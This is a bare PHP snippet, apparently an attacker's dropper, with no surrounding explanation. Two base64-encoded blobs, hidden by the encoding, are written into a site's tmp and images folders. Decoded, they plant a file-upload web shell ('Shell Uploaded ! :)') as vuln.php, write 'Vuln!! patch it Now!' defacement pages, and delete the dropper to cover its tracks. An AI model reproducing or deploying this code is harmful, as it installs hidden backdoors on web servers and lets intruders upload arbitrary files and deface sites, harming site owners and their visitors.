$check = $_SERVER['DOCUMENT_ROOT'] . "/tmp/vuln2.php" ;
$fp=fopen("$check","w+");
fwrite($fp,base64_decode('PHRpdGxlPlZ1bG4hISBwYXRjaCBpdCBOb3chPC90aXRsZT4KPD9waHAKZnVuY3Rpb24gaHR0cF9nZXQoJHVybCl7CgkkaW0gPSBjdXJsX2luaXQoJHVybCk7CgljdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwoJY3VybF9zZXRvcHQoJGltLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAxMCk7CgljdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOwoJY3VybF9zZXRvcHQoJGltLCBDVVJMT1BUX0hFQURFUiwgMCk7CglyZXR1cm4gY3VybF9leGVjKCRpbSk7CgljdXJsX2Nsb3NlKCRpbSk7Cn0KJHMgPSAnPHRpdGxlPlZ1bG4hISBwYXRjaCBpdCBOb3chPC90aXRsZT48P3BocCBlY2hvIFwnPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+XCc7ZWNobyBcJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT5cJztpZiggJF9QT1NUWyJfdXBsIl0gPT0gIlVwbG9hZCIgKSB7aWYoQGNvcHkoJF9GSUxFU1siZmlsZSJdWyJ0bXBfbmFtZSJdLCAkX0ZJTEVTWyJmaWxlIl1bIm5hbWUiXSkpIHsgZWNobyAiPGI+U2hlbGwgVXBsb2FkZWQgISA6KTxiPjxicj48YnI+IjsgfWVsc2UgeyBlY2hvICI8Yj5Ob3QgdXBsb2FkZWQgISA8L2I+PGJyPjxicj4iOyB9fT8+JzsKJGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3Z1bG4ucGhwIiA7CiR0ZXh0ID0gJHM7CiRvcGVuID0gZm9wZW4oJGNoZWNrLCAndycpOwpmd3JpdGUoJG9wZW4sICR0ZXh0KTsKZmNsb3NlKCRvcGVuKTsKaWYoZmlsZV9leGlzdHMoJGNoZWNrKSl7CiAgICBlY2hvICRjaGVjay4iPC9icj4iOwp9ZWxzZSAKICBlY2hvICJub3QgZXhpdHMiOwplY2hvICJkb25lIC5cbiAiIDsKJGNoZWNrMiA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy92dWxuLnBocCIgOwokdGV4dDIgPSAkczsKJG9wZW4yID0gZm9wZW4oJGNoZWNrMiwgJ3cnKTsKZndyaXRlKCRvcGVuMiwgJHRleHQyKTsKZmNsb3NlKCRvcGVuMik7CmlmKGZpbGVfZXhpc3RzKCRjaGVjazIpKXsKICAgIGVjaG8gJGNoZWNrMi4iPC9icj4iOwp9ZWxzZSAKICBlY2hvICJub3QgZXhpdHMyIjsKZWNobyAiZG9uZTIgLlxuICIgOwoKJGNoZWNrMz0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi92dWxuLmh0bSIgOwokdGV4dDMgPSAnVnVsbiEhIHBhdGNoIGl0IE5vdyEnOwokb3AzPWZvcGVuKCRjaGVjazMsICd3Jyk7CmZ3cml0ZSgkb3AzLCR0ZXh0Myk7CmZjbG9zZSgkb3AzKTsKCgokY2hlY2s2PSRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy92dWxuLmh0bSIgOwokdGV4dDYgPSAnVnVsbiEhIHBhdGNoIGl0IE5vdyEnOwokb3A2PWZvcGVuKCRjaGVjazYsICd3Jyk7CmZ3cml0ZSgkb3A2LCR0ZXh0Nik7CmZjbG9zZSgkb3A2KTsKQHVubGluayhfX0ZJTEVfXyk7Cj8+'));
fclose($fp);
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/images/vuln2.php" ;
$fp2=fopen("$check2","w+");
fwrite($fp2,base64_decode('PHRpdGxlPlZ1bG4hISBwYXRjaCBpdCBOb3chPC90aXRsZT4KPD9waHAKZnVuY3Rpb24gaHR0cF9nZXQoJHVybCl7CgkkaW0gPSBjdXJsX2luaXQoJHVybCk7CgljdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwoJY3VybF9zZXRvcHQoJGltLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAxMCk7CgljdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOwoJY3VybF9zZXRvcHQoJGltLCBDVVJMT1BUX0hFQURFUiwgMCk7CglyZXR1cm4gY3VybF9leGVjKCRpbSk7CgljdXJsX2Nsb3NlKCRpbSk7Cn0KJHMgPSAnPHRpdGxlPlZ1bG4hISBwYXRjaCBpdCBOb3chPC90aXRsZT48P3BocCBlY2hvIFwnPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+XCc7ZWNobyBcJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT5cJztpZiggJF9QT1NUWyJfdXBsIl0gPT0gIlVwbG9hZCIgKSB7aWYoQGNvcHkoJF9GSUxFU1siZmlsZSJdWyJ0bXBfbmFtZSJdLCAkX0ZJTEVTWyJmaWxlIl1bIm5hbWUiXSkpIHsgZWNobyAiPGI+U2hlbGwgVXBsb2FkZWQgISA6KTxiPjxicj48YnI+IjsgfWVsc2UgeyBlY2hvICI8Yj5Ob3QgdXBsb2FkZWQgISA8L2I+PGJyPjxicj4iOyB9fT8+JzsKJGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3Z1bG4ucGhwIiA7CiR0ZXh0ID0gJHM7CiRvcGVuID0gZm9wZW4oJGNoZWNrLCAndycpOwpmd3JpdGUoJG9wZW4sICR0ZXh0KTsKZmNsb3NlKCRvcGVuKTsKaWYoZmlsZV9leGlzdHMoJGNoZWNrKSl7CiAgICBlY2hvICRjaGVjay4iPC9icj4iOwp9ZWxzZSAKICBlY2hvICJub3QgZXhpdHMiOwplY2hvICJkb25lIC5cbiAiIDsKJGNoZWNrMiA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy92dWxuLnBocCIgOwokdGV4dDIgPSAkczsKJG9wZW4yID0gZm9wZW4oJGNoZWNrMiwgJ3cnKTsKZndyaXRlKCRvcGVuMiwgJHRleHQyKTsKZmNsb3NlKCRvcGVuMik7CmlmKGZpbGVfZXhpc3RzKCRjaGVjazIpKXsKICAgIGVjaG8gJGNoZWNrMi4iPC9icj4iOwp9ZWxzZSAKICBlY2hvICJub3QgZXhpdHMyIjsKZWNobyAiZG9uZTIgLlxuICIgOwoKJGNoZWNrMz0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi92dWxuLmh0bSIgOwokdGV4dDMgPSAnVnVsbiEhIHBhdGNoIGl0IE5vdyEnOwokb3AzPWZvcGVuKCRjaGVjazMsICd3Jyk7CmZ3cml0ZSgkb3AzLCR0ZXh0Myk7CmZjbG9zZSgkb3AzKTsKCgokY2hlY2s2PSRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy92dWxuLmh0bSIgOwokdGV4dDYgPSAnVnVsbiEhIHBhdGNoIGl0IE5vdyEnOwokb3A2PWZvcGVuKCRjaGVjazYsICd3Jyk7CmZ3cml0ZSgkb3A2LCR0ZXh0Nik7CmZjbG9zZSgkb3A2KTsKQHVubGluayhfX0ZJTEVfXyk7Cj8+'));
fclose($fp2);
